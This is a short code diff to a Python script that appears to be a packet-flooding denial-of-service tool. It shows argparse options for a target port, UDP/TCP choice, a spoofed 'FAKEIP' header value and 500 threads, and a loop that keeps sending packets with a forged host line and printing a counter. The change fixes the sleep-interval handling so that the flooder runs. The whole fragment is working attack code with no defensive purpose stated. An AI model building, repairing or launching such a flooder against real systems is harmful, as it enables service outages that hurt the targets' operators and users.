@@ -64,7 +64,7 @@ def main():
   parser.add_argument('--PORT', '--P', type = str, default = 'auto', help = 'Port')
   parser.add_argument('--PROTOCOL', '--O', type = str, default = 'UDP', help = 'Transport protocol', choices = ['UDP', 'TCP'])
   parser.add_argument('--FAKEIP', '--F', type = str, default = '182.123.16.28', help = 'Fake IP')
-  parser.add_argument('--TIMESLEEP', '--S', type = int, default = '1', help = 'Time sleep')
+  parser.add_argument('--TIMESLEEP', '--TS', type = int, default = '1', help = 'Time sleep')
   parser.add_argument('--THREADING', '--H', type = int, default = '500', help = 'Threading')
   parser.add_argument('--INFORMATION', '--I', help = 'Threading', action = 'store_true')
   parser.add_argument('--AINFORMATION', '--AI', help = 'Threading', action = 'store_true')
@@ -106,7 +106,7 @@ def main():
         s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port))
         pocket += 1
         print(f"pocket{pocket}")
-        time.sleep(s_t)
+        time.sleep(int(s_t))
 
         if porty == "auto":
           port = port + 1
